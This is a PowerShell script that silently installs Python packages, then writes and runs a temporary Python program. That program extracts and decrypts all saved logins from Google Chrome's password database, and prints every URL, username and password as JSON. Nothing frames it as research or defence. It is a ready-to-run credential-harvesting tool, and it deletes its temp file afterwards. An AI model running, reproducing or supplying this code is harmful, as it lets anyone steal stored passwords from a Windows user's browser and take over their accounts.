$ErrorActionPreference = 'Stop'

# Check if Python is installed
try {
    $null = python --version 2>&1
} catch {
    Write-Host "⚠️ Python not installed. Download from: https://www.python.org/downloads/"
    exit 1
}

# Install required Python packages
$packages = "pycryptodome", "pypiwin32", "requests"
python -m pip install --upgrade pip --quiet
python -m pip install $packages --quiet --no-warn-script-location

# Python script content
$pythonScript = @'
import os
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import base64

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    db_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for row in cursor.fetchall():
        url, username, password = row
        decrypted_password = decrypt_password(password, key)
        if username or decrypted_password:
            results.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })
    
    cursor.close()
    db.close()
    os.remove(filename)
    
    print(json.dumps(results, indent=4))

if __name__ == "__main__":
    main()
'@

# Execute the Python script
$tempFile = "$env:TEMP\chrome_passwords.py"
try {
    [System.IO.File]::WriteAllText($tempFile, $pythonScript)
    python $tempFile
} finally {
    Remove-Item $tempFile -ErrorAction SilentlyContinue
}
